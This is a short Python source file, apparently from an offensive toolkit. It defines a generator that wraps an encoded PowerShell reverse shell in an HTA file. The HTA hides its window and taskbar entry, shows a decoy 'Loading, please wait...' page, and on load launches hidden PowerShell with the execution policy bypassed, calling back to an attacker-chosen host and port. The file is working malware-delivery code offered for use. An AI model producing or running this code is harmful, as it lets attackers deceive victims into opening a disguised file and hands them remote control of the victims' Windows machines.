#!/usr/bin/env python3
import base64
from .powershell import PowerShellGenerator

class WindowsPayloadGenerator:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
        self.ps_gen = PowerShellGenerator(lhost, lport)
    
    def generate_hta_payload(self):
        """Generate HTA file with embedded PowerShell"""
        ps_payload = self.ps_gen.generate_reverse_shell()
        encoded = base64.b64encode(ps_payload.encode('utf-16le')).decode()
        
        hta = f'''
<html>
<head>
<title>Loading...</title>
<HTA:APPLICATION ID="app"
    APPLICATIONNAME="Application"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"/>

<script language="VBScript">
    Sub Window_OnLoad
        Dim shell
        Set shell = CreateObject("WScript.Shell")
        shell.Run "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded}", 0, False
        window.close()
    End Sub
</script>
</head>
<body>
<p>Loading, please wait...</p>
</body>
</html>
'''
        return hta.strip()